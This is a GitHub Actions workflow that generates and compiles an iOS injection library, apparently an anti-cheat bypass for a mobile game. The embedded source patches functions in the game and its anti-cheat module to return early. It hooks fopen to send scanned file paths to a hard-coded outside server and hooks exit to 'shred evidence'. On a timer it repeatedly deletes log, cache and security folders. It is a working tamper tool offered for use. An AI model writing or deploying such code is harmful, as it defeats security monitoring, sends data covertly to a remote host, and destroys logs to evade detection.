name: Imperial Shadow Full-Guard V15.3

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_shadow_engine:
    runs-on: macos-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Smelt Imperial Full Module
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #include <iostream>
          #include <thread>
          #include <chrono>
          #include <dlfcn.h>
          #include <mach-o/dyld.h>
          #include <sys/mman.h>

          using namespace std;

          // --- [ ميزة الـ Interpose الأصلية ] ---
          typedef struct interpose_substitution {
              const void* replacement;
              const void* original;
          } interpose_substitution_t;

          #define DYLD_INTERPOSE(_replacement,_original) \
             __attribute__((used)) static const interpose_substitution_t _interpose_##_original \
             __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };

          // --- [ محرك الأوفسات والباتش ] ---
          namespace Imperial {
              uintptr_t GetBase(const char* n) {
                  uint32_t c = _dyld_image_count();
                  for (uint32_t i = 0; i < c; i++) {
                      if (strstr(_dyld_get_image_name(i), n)) return (uintptr_t)_dyld_get_image_header(i);
                  }
                  return (uintptr_t)_dyld_get_image_header(0);
              }

              void Patch(uintptr_t base, uintptr_t off, uint32_t instr) {
                  uintptr_t target = base + off;
                  long sz = getpagesize();
                  uintptr_t pg = target & ~(sz - 1);
                  if (mprotect((void*)pg, sz, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
                      *(uint32_t*)target = instr;
                      mprotect((void*)pg, sz, PROT_READ | PROT_EXEC);
                  }
              }
          }

          // --- [ إعدادات السيرفر ] ---
          void RemoteLog(NSString *msg) {
              NSString *url = @"http://34.204.178.160:5000/log";
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"content": msg} options:0 error:nil];
              [req setHTTPBody:data];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          // --- [ مفرمة الملفات ] ---
          void WipeSecurityData() {
              NSString *docDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
              NSArray *trash = @[@"/GCloud", @"/Logs", @"/Caches", @"/.system_logs", @"/ano_tmp"];
              for (NSString *p in trash) {
                  [[NSFileManager defaultManager] removeItemAtPath:[docDir stringByAppendingString:p] error:nil];
              }
          }

          // --- [ رادار الملفات ] ---
          FILE* my_fopen(const char* path, const char* mode) {
              if (path && (strstr(path, "/var/mobile/") || strstr(path, "ShadowTrackerExtra"))) {
                  RemoteLog([NSString stringWithFormat:@"[🔍] SCAN: %s", path]);
              }
              return fopen(path, mode);
          }
          DYLD_INTERPOSE(my_fopen, fopen);

          // --- [ هوك الخروج ] ---
          void my_exit(int code) {
              RemoteLog(@"[⚠️] SHUTDOWN DETECTED! Shredding evidence...");
              WipeSecurityData();
              sleep(2);
              exit(code);
          }
          DYLD_INTERPOSE(my_exit, exit);

          // --- [ تفعيل الأوفسات ] ---
          void InitializeImperial() {
              uint32_t RET = 0xD65F03C0;
              uintptr_t sh = Imperial::GetBase("ShadowTrackerExtra");
              uintptr_t an = Imperial::GetBase("anogs");

              // تطبيق الأوفسات مالتك
              Imperial::Patch(sh, 0x18F04C, RET); 
              Imperial::Patch(sh, 0xE87A4, RET);  
              Imperial::Patch(an, 0x120598, RET); 
              
              RemoteLog(@"[🐲] Imperial V15.3 - Offsets Applied & Radar Active.");
          }

          __attribute__((constructor))
          static void entry() {
              thread([]() {
                  this_thread::sleep_for(chrono::seconds(10));
                  InitializeImperial();
                  while(true) {
                      this_thread::sleep_for(chrono::seconds(30));
                      WipeSecurityData();
                  }
              }).detach();
          }
          EOF

      - name: Compile Full Module
        run: |
          clang++ -dynamiclib -std=c++11 \
          -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 \
          jni/main.mm -o ShadowImperial.dylib \
          -framework Foundation -lobjc

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Imperial-Full-V15.3
          path: ShadowImperial.dylib
          
